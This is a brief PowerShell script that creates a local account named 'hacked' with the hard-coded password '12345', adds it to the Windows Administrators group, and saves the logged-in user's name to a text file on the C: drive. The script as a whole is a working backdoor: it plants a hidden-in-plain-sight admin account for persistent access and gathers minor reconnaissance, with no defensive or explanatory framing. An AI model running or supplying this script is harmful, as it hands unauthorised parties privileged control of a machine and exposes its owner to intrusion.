# Create a new user
New-LocalUser -Name "hacked" -Description "New user with admin rights" -Password (ConvertTo-SecureString "12345" -AsPlainText -Force)

# Add the user to the Administrators group
Add-LocalGroupMember -Group "Administrators" -Member "hacked"

Get-WmiObject -Class Win32_ComputerSystem | Select-Object -ExpandProperty UserName | Out-File -FilePath "C:/online_users.txt"
